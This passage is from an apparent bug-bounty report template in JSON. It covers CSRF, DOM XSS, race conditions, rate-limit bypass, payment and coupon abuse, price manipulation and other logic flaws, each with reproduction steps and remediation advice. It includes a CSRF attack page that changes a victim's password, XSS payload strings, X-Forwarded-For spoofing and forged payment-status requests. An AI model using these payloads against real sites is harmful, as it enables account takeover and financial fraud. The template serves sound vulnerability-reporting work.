                  "   d. **[What happened]**: When the victim's browser loads the malicious page, it automatically sends the GET request to `bank.example.com` with the victim's session cookies, performing the transfer.",
                  "   e. **[What should happen]**: Sensitive actions should never be performed via GET requests.",
                  "3. **[Scenario B: CSRF via POST Request (Missing Token)]**",
                  "   a. The application performs a sensitive action via a POST request (e.g., `POST /change_password`) but lacks a CSRF token.",
                  "   b. Create a malicious HTML page on `attacker.com` with a hidden HTML form that automatically submits to the vulnerable endpoint. Example:",
                  "     ```html\n     <form action=\"[https://bank.example.com/change_password](https://bank.example.com/change_password)\" method=\"POST\">\n       <input type=\"hidden\" name=\"new_password\" value=\"attacker_password\">\n       <input type=\"hidden\" name=\"confirm_password\" value=\"attacker_password\">\n     </form>\n     <script>document.forms[0].submit();</script>\n     ```",
                  "   c. Trick an authenticated victim into visiting `attacker.com`.",
                  "   d. **[What happened]**: The hidden form automatically submits, changing the victim's password to `attacker_password`.",
                  "   e. **[What should happen]**: All sensitive POST requests should include a unique, unpredictable, and user-specific CSRF token.",
                  "4. **[Scenario C: CSRF via PUT/DELETE (Missing Token)]**",
                  "   a. Similar to POST, but for PUT or DELETE requests, often via AJAX/Fetch. The attacker can use JavaScript to send cross-site AJAX requests if CORS is misconfigured or if `SameSite` cookies are not strict."
                ],
                "proof_of_concept": {
                  "attacker_html_example": "<html><body>\n  <p>Click here for a funny cat video!</p>\n  <img src=\"https://bank.example.com/transfer?to=attacker_account&amount=1000\" style=\"display:none;\">\n  \n  <form id=\"csrfForm\" action=\"https://bank.example.com/change_password\" method=\"POST\">\n    <input type=\"hidden\" name=\"new_password\" value=\"attacker_password\">\n    <input type=\"hidden\" name=\"confirm_password\" value=\"attacker_password\">\n  </form>\n  <script>document.getElementById('csrfForm').submit();</script>\n</body></html>",
                  "notes": "Provide the malicious HTML page source. Screenshots or a video demonstrating the unauthorized action being performed on the legitimate site after the victim visits the attacker's page. Show the HTTP request being sent with the victim's cookies."
                },
                "impact": "Unauthorized actions performed on behalf of the victim without their knowledge or consent, leading to fund transfers, password changes, account deletions, data manipulation, or social media posts. This can result in significant financial loss, account compromise, and reputational damage.",
                "remediation_suggestion": "Implement CSRF tokens for all sensitive state-changing requests (POST, PUT, DELETE). Tokens should be unique per user session, unpredictable, and validated server-side. Use the `SameSite` cookie attribute (set to `Lax` or `Strict`) for session cookies. Avoid performing sensitive actions via GET requests. Validate the `Referer` or `Origin` header for critical requests as a secondary defense."
              },
              {
                "vulnerability_name": "DOM-based XSS (Explicit)",
                "summary": "DOM-based XSS occurs when the vulnerability lies entirely within client-side code (JavaScript) that processes data from an untrusted source (e.g., URL fragment, `document.referrer`) and writes it to a DOM sink (e.g., `innerHTML`, `document.write`) without proper sanitization, leading to script execution.",
                "severity": "High",
                "target": "[Specify affected asset, e.g., app.example.com]",
                "url_location": "[Full URL of the vulnerable page, typically with a fragment or query parameter, e.g., https://app.example.com/search#q=]",
                "steps_to_reproduce": [
                  "1. Identify a web page where client-side JavaScript reads data from the URL (e.g., `location.hash`, `location.search`, `document.URL`) or other untrusted sources (e.g., `document.referrer`, `localStorage`).",
                  "2. Identify a DOM sink where this data is written without sanitization (e.g., `document.write()`, `element.innerHTML`, `element.outerHTML`, `jQuery.html()`, `location.href`).",
                  "3. Craft a malicious URL that includes an XSS payload in the part of the URL that the JavaScript reads. Example: `https://app.example.com/search#q=<img src=x onerror=alert(document.domain)>`.",
                  "4. **[What happened]**: When the victim's browser loads the URL, the client-side JavaScript reads the malicious payload from `location.hash` (or other source) and writes it to the DOM, causing the `alert` box to pop up.",
                  "5. **[What should happen]**: The client-side JavaScript should sanitize all untrusted input before writing it to a DOM sink.",
                  "6. **[Scenario B: DOM-based XSS via `document.referrer`]**",
                  "   a. Identify a page that uses `document.referrer` insecurely.",
                  "   b. Host a malicious page on `attacker.com` that links to the vulnerable page, with the XSS payload in the `referrer` URL. Example: `<a href=\"https://app.example.com/vulnerable_page\" referrer=\"javascript:alert(document.domain)\">Click me</a>` (though `referrer` attribute is complex and often sanitized by browsers). A more common approach is to embed the vulnerable page in an iframe on a malicious page whose URL contains the payload.",
                  "   c. **[What happened]**: The XSS payload executes on the legitimate domain.",
                  "   d. **[What should happen]**: `document.referrer` should be treated as untrusted input."
                ],
                "proof_of_concept": {
                  "url_example": "https://app.example.com/search#q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E",
                  "vulnerable_js_snippet_example": "var query = window.location.hash.substring(3);\ndocument.getElementById('search_results').innerHTML = 'Results for: ' + query;",
                  "notes": "Provide the exact malicious URL. Include a screenshot of the XSS payload executing (e.g., alert box). If possible, point to the vulnerable JavaScript code snippet that causes the DOM manipulation."
                },
                "impact": "Session hijacking, sensitive data theft, website defacement, and phishing. Unlike reflected/stored XSS, the payload might never touch the server, making it harder to detect with server-side scanning tools. It relies purely on client-side processing.",
                "remediation_suggestion": "Sanitize all user-controlled data before it is written to any DOM sink. Use safe DOM manipulation methods (e.g., `textContent` instead of `innerHTML`). Avoid using `eval()`, `document.write()`, or `element.outerHTML` with untrusted data. Implement a strong Content Security Policy (CSP) with strict `script-src` and `object-src` directives to mitigate XSS."
              },
              {
                "vulnerability_name": "Self-XSS (Note for social engineering)",
                "summary": "Self-XSS occurs when an attacker can inject malicious JavaScript into a web page, but the payload only executes in their *own* browser. It typically requires the user to manually paste the malicious code into their browser's developer console or a specific input field, making it not directly exploitable by an attacker without significant social engineering.",
                "severity": "Informational",
                "target": "[Specify affected asset, e.g., profile.example.com]",
                "url_location": "[Full URL of the page where self-XSS can be achieved, e.g., https://profile.example.com/settings]",
                "steps_to_reproduce": [
                  "1. Identify an input field or a client-side JavaScript execution context where you can paste or inject JavaScript.",
                  "2. **[Scenario A: Developer Console Injection]**",
                  "   a. Navigate to any page on the application.",
                  "   b. Open the browser's developer console (F12 or Ctrl+Shift+I).",
                  "   c. Paste the XSS payload into the console and press Enter. Example: `alert(document.domain)`.",
                  "   d. **[What happened]**: The `alert` box pops up.",
                  "   e. **[What should happen]**: The developer console is an intended feature for developers, and execution here is generally not considered a vulnerability, but it can be used for social engineering.",
                  "3. **[Scenario B: Limited Input Field Reflection (Self-Only)]**",
                  "   a. Identify an input field (e.g., a profile description, a private note) where you can inject HTML/JavaScript, but the reflection is only visible to the user who entered it.",
                  "   b. Example: Enter `<script>alert('Self-XSS!')</script>` into your own profile description.",
                  "   c. **[What happened]**: When you view your own profile, the `alert` box pops up.",
                  "   d. **[What should happen]**: All user-supplied input should be properly sanitized, even if only reflected to the user themselves, to prevent potential chaining or unexpected behavior."
                ],
                "proof_of_concept": {
                  "notes": "Provide screenshots of the developer console with the executed payload or the page showing the self-XSS alert. Emphasize that this requires manual user action (pasting into console) or is only visible to the user themselves. Clearly state that this is not a direct exploit but a social engineering vector."
                },
                "impact": "Not directly exploitable by an attacker without significant social engineering. An attacker would need to convince a victim to manually paste malicious code into their browser's developer console. If successful, it could lead to session hijacking or data theft. However, most bug bounty programs consider this out of scope or informational unless a clear, practical social engineering vector is demonstrated beyond 'paste into console'.",
                "remediation_suggestion": "While often considered informational, it's good practice to sanitize all user-supplied input before reflection, even if it's only visible to the user themselves. This prevents potential chaining with other vulnerabilities and reduces the surface for social engineering. Display warnings about pasting code into the developer console."
              },
              {
                "vulnerability_name": "Race Condition",
                "summary": "A Race Condition occurs when the outcome of an operation depends on the unpredictable sequence or timing of events. In web applications, this often involves multiple concurrent requests to a sensitive endpoint, allowing an attacker to bypass limits, perform unauthorized actions, or gain an unfair advantage.",
                "severity": "High",
                "target": "[Specify affected asset, e.g., shop.example.com]",
                "url_location": "[Full URL of the vulnerable endpoint, e.g., https://shop.example.com/buy_item]",
                "steps_to_reproduce": [
                  "1. Identify a sensitive operation that involves a check-then-act logic (e.g., checking stock before purchase, checking coupon validity before applying, checking balance before transfer).",
                  "2. **[Scenario A: Concurrent Purchase/Coupon Use]**",
                  "   a. Find an item with limited stock (e.g., 1 remaining) or a single-use coupon.",
                  "   b. Capture the purchase request or coupon application request.",
                  "   c. Send multiple identical requests concurrently (e.g., using Burp Suite Intruder's 'Sniper' attack with multiple threads, or a custom script). Aim for 10-50 concurrent requests.",
                  "   d. **[What happened]**: The application processes multiple purchases for the single item, or applies the single-use coupon multiple times, leading to over-selling or multiple discounts.",
                  "   e. **[What should happen]**: The application should ensure atomicity of operations, preventing multiple concurrent requests from bypassing the check-then-act logic.",
                  "3. **[Scenario B: Account Creation/Deletion Race]**",
                  "   a. If there's a unique constraint (e.g., username, email), try to create two accounts with the same unique identifier simultaneously.",
                  "   b. **[What happened]**: Due to a race, two accounts with the same unique identifier are created, or one is created and then immediately deleted/overwritten.",
                  "   c. **[What should happen]**: Database constraints and application logic should prevent such concurrent unique violations.",
                  "4. **[Scenario C: Rate Limit Bypass via Race]**",
                  "   a. If an endpoint has a rate limit (e.g., 5 requests per minute), try sending 10 requests concurrently within a short window.",
                  "   b. **[What happened]**: The application processes all 10 requests, bypassing the rate limit, because the check and increment of the counter happen before the concurrent requests are fully processed."
                ],
                "proof_of_concept": {
                  "request_example": "POST /buy_item HTTP/1.1\nHost: shop.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"item_id\": \"limited_stock_item\", \"quantity\": 1}",
                  "notes": "Provide details on the concurrent requests (number of threads, timing). Show evidence of the successful race condition (e.g., multiple order confirmations for a single item, multiple coupon applications, logs showing concurrent processing). A video demonstrating the tool setup and the outcome is highly recommended."
                },
                "impact": "Financial loss (over-selling, multiple discounts, unauthorized transfers). Data inconsistency (duplicate accounts, incorrect balances). Denial of Service (DoS) if critical resources are exhausted. Can lead to privilege escalation or authentication bypass in specific scenarios where race conditions affect security-critical checks.",
                "remediation_suggestion": "Implement server-side synchronization mechanisms (e.g., locks, transactions, mutexes) for sensitive operations to ensure atomicity. Use database transactions with appropriate isolation levels. Implement robust rate limiting that is resilient to concurrent requests. Re-verify critical conditions (e.g., stock, balance) immediately before committing an action, even after an initial check."
              },
              {
                "vulnerability_name": "Rate Limit Bypass",
                "summary": "Rate Limit Bypass allows an attacker to circumvent restrictions on the number of requests that can be made to an application endpoint within a given timeframe. This can enable brute-force attacks, credential stuffing, or denial of service.",
                "severity": "Medium",
                "target": "[Specify affected asset, e.g., auth.example.com]",
                "url_location": "[Full URL of the rate-limited endpoint, e.g., https://auth.example.com/login, https://auth.example.com/forgot_password]",
                "steps_to_reproduce": [
                  "1. Identify an endpoint that is expected to have rate limiting (e.g., login, password reset, OTP verification, registration, search).",
                  "2. **[Scenario A: IP-based Rate Limit Bypass (X-Forwarded-For)]**",
                  "   a. Send multiple requests to the endpoint, incrementing the `X-Forwarded-For` header with a different IP address for each request. Example: `X-Forwarded-For: 1.1.1.1`, then `X-Forwarded-For: 1.1.1.2`, etc.",
                  "   b. **[What happened]**: The application processes all requests without triggering the rate limit, indicating that rate limiting is only based on the `X-Forwarded-For` header (or similar) which can be spoofed.",
                  "   c. **[What should happen]**: Rate limiting should be based on the actual client IP, session ID, or a combination of factors, and be resilient to header manipulation.",
                  "3. **[Scenario B: Parameter-based Rate Limit Bypass (Username/Email)]**",
                  "   a. The rate limit is tied to the username/email being targeted (e.g., 5 login attempts per username).",
                  "   b. Try to brute-force a single account by sending multiple requests, but slightly modifying the username/email in each request (e.g., adding a space, changing capitalization if not normalized). Example: `username=user1`, `username=user1 `, `username=User1`.",
                  "   c. **[What happened]**: The application processes all attempts, bypassing the per-user rate limit.",
                  "   d. **[What should happen]**: Rate limiting should normalize input before applying limits.",
                  "4. **[Scenario C: Cookie/Session-based Rate Limit Bypass]**",
                  "   a. If the rate limit is tied to a session cookie, try sending multiple requests, but clearing or changing the session cookie for each request.",
                  "   b. **[What happened]**: The application processes all requests, bypassing the session-based limit.",
                  "   c. **[What should happen]**: Rate limits should be applied per IP, or a combination of factors, not solely on easily resettable client-side identifiers.",
                  "5. **[Scenario D: Adding Null Bytes/Extra Characters]**",
                  "   a. Append null bytes (`%00`) or other non-standard characters to the end of a parameter to bypass poorly implemented string matching in rate limit logic. Example: `username=test%00`."
                ],
                "proof_of_concept": {
                  "request_example": "POST /login HTTP/1.1\nHost: auth.example.com\nX-Forwarded-For: 1.1.1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=victim&password=wrongpass\n\n---\n\nPOST /login HTTP/1.1\nHost: auth.example.com\nX-Forwarded-For: 1.1.1.2\nContent-Type: application/x-www-form-urlencoded\n\nusername=victim&password=wrongpass",
                  "notes": "Provide the exact requests used to bypass the rate limit. Show evidence that the rate limit was bypassed (e.g., successful brute-force, multiple OTP requests, no lockout, network tab showing many successful requests). A video demonstrating the bypass using a tool like Burp Suite Intruder is highly recommended."
                },
                "impact": "Enables brute-force attacks on credentials, OTPs, or other tokens. Facilitates username/email enumeration. Can lead to denial of service (DoS) by overwhelming the server with requests. Undermines the security controls intended to prevent automated attacks.",
                "remediation_suggestion": "Implement robust rate limiting based on a combination of factors (IP address, session ID, user ID after authentication, normalized input values). Ensure rate limits are applied server-side and are resilient to header manipulation (e.g., `X-Forwarded-For`). Use a CAPTCHA or other challenge mechanisms after a few failed attempts. Implement account lockout policies after a certain number of failed attempts."
              },
              {
                "vulnerability_name": "Bypass Payment Process",
                "summary": "Bypass Payment Process allows an attacker to complete a purchase or obtain a service without making the required payment, typically by manipulating payment parameters, skipping payment steps, or exploiting logical flaws in the checkout flow.",
                "severity": "Critical",
                "target": "[Specify affected asset, e.g., shop.example.com]",
                "url_location": "[Full URL of the checkout or payment confirmation endpoint, e.g., https://shop.example.com/checkout/confirm]",
                "steps_to_reproduce": [
                  "1. Add an item to the shopping cart and proceed to the checkout process.",
                  "2. **[Scenario A: Price Manipulation (already covered, but often part of payment bypass)]**",
                  "   a. Intercept the request that sends the item details or total price to the server.",
                  "   b. Modify the price parameter to `0` or a negative value.",
                  "   c. **[What happened]**: The application accepts the manipulated price, allowing the purchase for free or at a reduced cost.",
                  "   d. **[What should happen]**: Prices should be validated server-side and fetched from a trusted source.",
                  "3. **[Scenario B: Skipping Payment Step]**",
                  "   a. Proceed through the checkout flow until just before the final payment submission.",
                  "   b. Try to directly access the 'Order Confirmation' or 'Download' page (e.g., `https://shop.example.com/order/success` or `https://shop.example.com/download/product_id`).",
                  "   c. **[What happened]**: The application allows access to the post-payment page or grants access to the product without verifying that payment was successfully completed.",
                  "   d. **[What should happen]**: The application should strictly validate payment status before granting access to paid content/services.",
                  "4. **[Scenario C: Manipulating Payment Status/Gateway Response]**",
                  "   a. If the application relies on client-side parameters or a predictable response from a payment gateway to confirm payment.",
                  "   b. Intercept the payment gateway callback or the application's internal payment confirmation request. Modify a parameter like `payment_status=success` or `amount_paid=original_amount`.",
                  "   c. **[What happened]**: The application registers the payment as successful, even if no actual payment occurred.",
                  "   d. **[What should happen]**: Payment status should be verified server-side with the payment gateway using a secure, server-to-server callback or API.",
                  "5. **[Scenario D: Using Invalid/Expired Coupons (already covered, but can lead to payment bypass)]**"
                ],
                "proof_of_concept": {
                  "request_example": "POST /checkout/confirm HTTP/1.1\nHost: shop.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"order_id\": \"123\", \"payment_status\": \"success\"}",
                  "notes": "Provide the exact requests used to bypass payment. Include screenshots or a video demonstrating the successful purchase or access to paid content without actual payment. Show the order confirmation page or product download."
                },
                "impact": "Direct financial loss for the business. Unauthorized access to paid products, services, or content. Can lead to inventory inconsistencies and reputational damage. This is a critical business logic flaw.",
                "remediation_suggestion": "Implement all payment logic and validation on the server-side. Never trust client-side parameters for price, quantity, or payment status. Verify payment status directly with the payment gateway via secure server-to-server API calls. Ensure multi-step processes (like checkout) have proper state validation at each step. Implement robust anti-fraud controls and logging for all payment-related activities."
              },
              {
                "vulnerability_name": "Coupon Abuse",
                "summary": "Coupon Abuse allows an attacker to exploit flaws in the application's coupon or discount code validation, enabling them to use expired, invalid, or single-use coupons multiple times, or apply discounts incorrectly, leading to financial loss for the business.",
                "severity": "Medium",
                "target": "[Specify affected asset, e.g., shop.example.com]",
                "url_location": "[Full URL of the cart or checkout endpoint where coupons are applied, e.g., https://shop.example.com/cart/apply_coupon]",
                "steps_to_reproduce": [
                  "1. Obtain a coupon code (e.g., a single-use code, an expired code, or a code with specific usage limits).",
                  "2. Add an item to the cart and proceed to the coupon application stage.",
                  "3. **[Scenario A: Multiple Use of Single-Use Coupon]**",
                  "   a. Apply a single-use coupon to your cart.",
                  "   b. Complete the purchase.",
                  "   c. Add another item to the cart and try to apply the *same* single-use coupon again.",
                  "   d. **[What happened]**: The application allows the coupon to be applied multiple times.",
                  "   e. **[What should happen]**: Single-use coupons should be invalidated after the first successful use.",
                  "4. **[Scenario B: Using Expired/Invalid Coupons]**",
                  "   a. Obtain an expired coupon code or a code that was never valid.",
                  "   b. Attempt to apply it to your cart.",
                  "   c. **[What happened]**: The application accepts the expired/invalid coupon, applying the discount.",
                  "   d. **[What should happen]**: Coupons should be validated for expiry and validity server-side.",
                  "5. **[Scenario C: Applying Coupon to Excluded Items]**",
                  "   a. Obtain a coupon that is only valid for specific product categories or items.",
                  "   b. Add an excluded item to your cart.",
                  "   c. Attempt to apply the coupon.",
                  "   d. **[What happened]**: The application applies the discount to the excluded item.",
                  "   e. **[What should happen]**: Coupon restrictions (e.g., product categories, minimum purchase) should be enforced server-side.",
                  "6. **[Scenario D: Race Condition (already covered, but common for coupons)]**",
                  "   a. For a single-use coupon, send multiple concurrent requests to apply the coupon."
                ],
                "proof_of_concept": {
                  "request_example": "POST /cart/apply_coupon HTTP/1.1\nHost: shop.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"coupon_code\": \"SINGLEUSE123\"}",
                  "notes": "Provide the coupon code used. Screenshots or a video demonstrating the successful application of an expired/invalid/multi-use coupon, and the resulting discount applied to the cart/order."
                },
                "impact": "Direct financial loss for the business due to unauthorized discounts. Can lead to inventory issues if discounts cause unexpected demand. Undermines marketing campaigns and promotional strategies.",
                "remediation_suggestion": "Implement all coupon validation logic (validity, expiry, usage limits, applicable products/categories) strictly on the server-side. Ensure single-use coupons are invalidated immediately after successful use. Apply robust synchronization mechanisms (e.g., database transactions) to prevent race conditions on coupon usage. Never trust client-side parameters for coupon validation."
              },
              {
                "vulnerability_name": "Price Manipulation",
                "summary": "Price Manipulation allows an attacker to alter the price of products or services in an e-commerce application, enabling them to purchase items at a reduced cost or for free, leading to direct financial loss for the business.",
                "severity": "Critical",
                "target": "[Specify affected asset, e.g., shop.example.com]",
                "url_location": "[Full URL of the cart, checkout, or API endpoint handling pricing, e.g., https://shop.example.com/api/update_cart_item]",
                "steps_to_reproduce": [
                  "1. Add an item to the shopping cart.",
                  "2. Intercept the request that sends item details, quantity, or price to the server (e.g., when adding to cart, updating quantity, or proceeding to checkout).",
                  "3. **[Scenario A: Client-Side Price Override]**",
                  "   a. Modify the `price` parameter in the intercepted request to a lower value (e.g., `0`, `0.01`, or a negative number).",
                  "   b. **[What happened]**: The application accepts the manipulated price, and the item is added to the cart or purchased at the altered price.",
                  "   c. **[What should happen]**: Prices should be validated server-side and fetched from a trusted source.",
                  "4. **[Scenario B: Quantity Manipulation leading to Price Error]**",
                  "   a. Add an item to the cart. Intercept the request to update quantity.",
                  "   b. Set the quantity to an extremely large number (e.g., `999999999`) or a negative number (`-1`).",
                  "   c. **[What happened]**: The application's price calculation overflows, underflows, or results in an error that can be exploited to set the price to zero or a very low value.",
                  "   d. **[What should happen]**: Quantity should be validated for reasonable ranges and positive values.",
                  "5. **[Scenario C: Discount/Tax Manipulation]**",
                  "   a. Intercept the request that calculates or applies discounts/taxes.",
                  "   b. Modify parameters related to discounts or taxes (e.g., `discount_amount`, `tax_rate`) to reduce the final price.",
                  "   c. **[What happened]**: The application accepts the manipulated discount/tax, leading to a lower final price.",
                  "   d. **[What should happen]**: Discount and tax calculations should be performed server-side based on trusted data."
                ],
                "proof_of_concept": {
                  "request_example": "POST /api/update_cart_item HTTP/1.1\nHost: shop.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"item_id\": \"product_xyz\", \"quantity\": 1, \"price\": 0.01}",
                  "notes": "Provide the exact requests used to manipulate the price. Include screenshots or a video demonstrating the item being purchased or added to the cart at the manipulated price. Show the final order confirmation or receipt."
                },
                "impact": "Direct and significant financial loss for the business. Inventory inconsistencies. Can lead to widespread fraud and reputational damage. This is a critical business logic flaw directly impacting revenue.",
                "remediation_suggestion": "All pricing, quantity, discount, and tax calculations must be performed strictly on the server-side. Never trust client-side parameters for these values. Fetch prices from a trusted database or internal service. Implement robust input validation for quantities and other numeric inputs. Re-verify the total price on the server before finalizing any order."
              },
              {
                "vulnerability_name": "Order Tampering",
                "summary": "Order Tampering allows an attacker to modify details of a pending order (e.g., quantity, items, shipping address, payment method) after it has been placed but before it is finalized or shipped, leading to unauthorized changes, financial fraud, or delivery to an unintended address.",
                "severity": "High",
                "target": "[Specify affected asset, e.g., shop.example.com]",
                "url_location": "[Full URL of the order modification or confirmation endpoint, e.g., https://shop.example.com/order/modify?id=123]",
                "steps_to_reproduce": [
                  "1. Place an order on the application but do not finalize payment or wait until it's in a 'pending' or 'processing' state.",
                  "2. Identify the endpoint or functionality that allows viewing or modifying the order details.",
                  "3. **[Scenario A: Modifying Order Items/Quantity]**",
                  "   a. Intercept the request to view or update the order.",
                  "   b. Modify parameters related to items (e.g., `item_id`, `quantity`) to add/remove items or change quantities, especially for items that were out of stock or more expensive.",
                  "   c. **[What happened]**: The application accepts the modified order, updating items or quantities without proper re-validation of price or stock.",
                  "   d. **[What should happen]**: Order details should be immutable once placed, or any modifications should trigger full re-validation and re-calculation.",
                  "4. **[Scenario B: Changing Shipping Address/Method]**",
                  "   a. Intercept the request to update the shipping information for a pending order.",
                  "   b. Modify the `shipping_address` to an attacker-controlled address or change the `shipping_method` to a cheaper/more expensive option without price adjustment.",
                  "   c. **[What happened]**: The application updates the shipping details, potentially redirecting delivery or altering shipping costs.",
                  "   d. **[What should happen]**: Changes to shipping should be re-validated and might require re-authentication.",
                  "5. **[Scenario C: Changing Payment Method/Status (if not fully finalized)]**",
                  "   a. If the payment is not fully captured, try to change the payment method or inject a 'paid' status.",
                  "   b. **[What happened]**: The order proceeds with an unauthorized payment method or is marked as paid without actual payment.",
                  "   c. **[What should happen]**: Payment methods should be strictly controlled, and status should be verified with the gateway."
                ],
                "proof_of_concept": {
                  "request_example": "POST /order/modify?id=123 HTTP/1.1\nHost: shop.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"action\": \"update_item\", \"item_id\": \"expensive_item\", \"quantity\": 1}",
                  "notes": "Provide the exact requests used to tamper with the order. Include screenshots or a video demonstrating the successful modification of order details (e.g., items changed, shipping address altered) and the final state of the order."
                },
                "impact": "Financial loss for the business (e.g., receiving more expensive items for less, free shipping). Unauthorized delivery of goods to an attacker's address. Inventory inconsistencies. Can lead to customer dissatisfaction and reputational damage. This is a critical business logic flaw.",
                "remediation_suggestion": "Implement strict server-side validation for all order modification requests. Once an order is placed, make its core details (items, quantities, total price) immutable unless a specific, secure modification workflow is designed. Any allowed modifications (e.g., shipping address) should trigger full re-validation of costs and potentially require re-authentication. Ensure that order status transitions are strictly controlled and verified server-side."
              },
              {
                "vulnerability_name": "Improper Multi-Step Action Validation",
                "summary": "Improper Multi-Step Action Validation occurs when an application fails to properly enforce the sequential order or state of a multi-step process. Attackers can bypass intermediate steps, skip validations, or manipulate data between steps, leading to unauthorized actions or privilege escalation.",
                "severity": "High",
                "target": "[Specify affected asset, e.g., portal.example.com]",
                "url_location": "[Full URL of the multi-step process, e.g., https://portal.example.com/account/create_user/step1]",
                "steps_to_reproduce": [
                  "1. Identify a multi-step process (e.g., user registration, password reset, account creation, multi-page forms, checkout process).",
                  "2. **[Scenario A: Skipping Steps]**",
                  "   a. Start the multi-step process (e.g., go to `step1`).",
                  "   b. Instead of proceeding to `step2`, try to directly access `step3` or the final confirmation page (e.g., `https://portal.example.com/account/create_user/step3`).",
                  "   c. **[What happened]**: The application allows direct access to later steps without completing or validating previous steps, potentially bypassing required inputs or validations.",
                  "   d. **[What should happen]**: The application should verify that all preceding steps have been completed and validated in the correct order.",
                  "3. **[Scenario B: Tampering Data Between Steps]**",
                  "   a. Proceed from `step1` to `step2`. Intercept the request between these steps.",
                  "   b. Modify data that was submitted in `step1` (e.g., change user role, price, quantity) before it's processed in `step2` or `step3`.",
                  "   c. **[What happened]**: The application accepts the tampered data in later steps, leading to unauthorized changes (e.g., creating an admin user from a regular user registration flow, manipulating a price).",
                  "   d. **[What should happen]**: All data submitted in previous steps should be re-validated at each subsequent step, or stored securely server-side and not exposed to client-side modification.",
                  "4. **[Scenario C: Replaying Requests to Earlier Steps]**",
                  "   a. Complete a multi-step process (e.g., user creation).",
                  "   b. Capture the requests for earlier steps (e.g., `step1`'s data submission).",
                  "   c. Try replaying the request for `step1` with different data, and then immediately jump to the final step's request.",
                  "   d. **[What happened]**: The application processes the replayed data, creating another user or performing an unintended action.",
                  "   e. **[What should happen]**: Each step should be tied to a unique session token or state that prevents replay attacks."
                ],
                "proof_of_concept": {
                  "request_example": "GET /account/create_user/step3 HTTP/1.1\nHost: portal.example.com\nCookie: sessionid=[your_session_id]",
                  "notes": "Provide the exact URLs or requests used to bypass steps or tamper with data. Include screenshots or a video demonstrating the successful bypass of steps and the resulting unauthorized action (e.g., creation of an admin account, altered order details)."
                },
                "impact": "Authentication bypass, privilege escalation, data manipulation, and financial fraud. Attackers can create privileged accounts, bypass payment, or alter critical application states, leading to severe security and business impacts.",
                "remediation_suggestion": "Implement robust server-side state management for multi-step processes. Ensure that each step validates that the preceding steps have been completed correctly and in the proper sequence. Store sensitive data securely on the server-side between steps, rather than relying on client-side parameters. Re-validate all critical data at each step, especially before finalization. Implement unique tokens or session IDs for each step to prevent replay attacks."
              },
              {
                  "vulnerability_name": "Duplicate Payment / Action Execution Bugs",
                  "summary": "Duplicate Payment / Action Execution bugs occur when an application fails to properly handle concurrent or repeated requests for a sensitive action, allowing a user to execute the action multiple times (e.g., make multiple payments, apply a discount multiple times, create duplicate resources) when it should only be executed once.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., payment.example.com]",
                  "url_location": "[Full URL of the vulnerable endpoint, e.g., https://payment.example.com/process_payment]",
                  "steps_to_reproduce": [
                    "1. Identify an action that should only occur once per user or transaction (e.g., submitting a payment, confirming an order, sending an email, applying a single-use coupon).",
                    "2. Initiate the action and intercept the request (e.g., using Burp Suite).",
                    "3. Send the same request multiple times concurrently or in rapid succession. This can be done by:",
                    "   a. Using a tool like Burp Suite Intruder with multiple threads.",
                    "   b. Rapidly clicking the 'Submit' button multiple times in the browser.",
                    "   c. Refreshing the payment confirmation page immediately after submission.",
                    "4. **[What happened]**: The application processes the payment/action multiple times, leading to duplicate charges, multiple order confirmations, or other unintended consequences.",
                    "5. **[What should happen]**: The application should have idempotent processing, ensuring that even if the request is sent multiple times, the action is executed only once and its state is not duplicated."
                  ],
                  "proof_of_concept": {
                    "request_example": "POST /process_payment HTTP/1.1\nHost: payment.example.com\nCookie: sessionid=[your_session_id]\nContent-Type: application/json\n\n{\"transaction_id\": \"TXN12345\", \"amount\": 100}",
                    "notes": "Provide the exact requests sent. Show evidence of the duplicate action (e.g., multiple charges on a bank statement, multiple order IDs for the same single item, multiple confirmation emails). A video demonstrating the concurrent requests and the resulting multiple actions is highly recommended."
                  },
                  "impact": "Direct financial loss to the business or user (duplicate charges). Creation of fraudulent orders or resources. Data inconsistency. Can lead to reputational damage and customer dissatisfaction. This is a critical business logic flaw.",
                  "remediation_suggestion": "Implement server-side idempotency for all sensitive and state-changing actions. Use unique transaction IDs or nonces to track requests and ensure they are processed only once. Implement proper locking mechanisms or database transactions to prevent race conditions. After an action is initiated, prevent resubmission of the form or disable the action button client-side, and validate server-side that the transaction is unique."
                },
                {
                  "vulnerability_name": "Business Logic Abuse",
                  "summary": "Business Logic Abuse involves manipulating the legitimate workflow or expected behavior of an application to achieve an unintended outcome, often by exploiting flaws in how the application processes its business rules. This can lead to unauthorized access, data manipulation, financial fraud, or privilege escalation.",
                  "severity": "High",
                  "target": "[Specify affected asset, e.g., app.example.com]",
                  "url_location": "[Full URL of the exploited endpoint, e.g., https://app.example.com/create_report]",
                  "steps_to_reproduce": [
                    "1. Understand the intended business flow of a specific feature (e.g., report generation, data export, account upgrade, content publishing).",
                    "2. Identify potential points where the logic might be flawed or where assumptions are made about user behavior.",
                    "3. **[Scenario A: Unauthorized Data Access/Export]**",
                    "   a. The application allows users to create reports based on their own data.",
                    "   b. Try to manipulate parameters (e.g., `user_id`, `report_template_id`) to generate a report containing data belonging to other users or using templates you shouldn't access.",
                    "   c. **[What happened]**: The application generates a report with unauthorized data.",
                    "   d. **[What should happen]**: The application should strictly enforce object-level authorization for all data and resources.",
                    "4. **[Scenario B: Workflow Bypass/Step Skipping]**",
                    "   a. (Already covered in 'Improper Multi-Step Action Validation') This is a common form of business logic abuse.",
                    "5. **[Scenario C: Role Manipulation (already covered in 'Role Creation Abuse')]**",
                    "   a. (This is a specific form of business logic abuse.)",
                    "6. **[Scenario D: Feature Misuse]**",
                    "   a. An application has a 'revert to previous version' feature for content.",
                    "   b. A regular user might try to revert content that was published by an administrator or content they don't own, or revert to a version that contains sensitive data (e.g., a draft that was never meant to be public).",
                    "   c. **[What happened]**: The application allows the user to revert unauthorized content or expose sensitive drafts.",
                    "   d. **[What should happen]**: The application should verify authorization for all content operations and content state transitions.",
                    "7. **[Scenario E: Data State Manipulation]**",
                    "   a. An application allows users to 'mark as read' a message.",
                    "   b. Try to intercept the request and change the `message_id` to mark other users' messages as read.",
                    "   c. **[What happened]**: Other users' messages are marked as read in their inbox."
                  ],
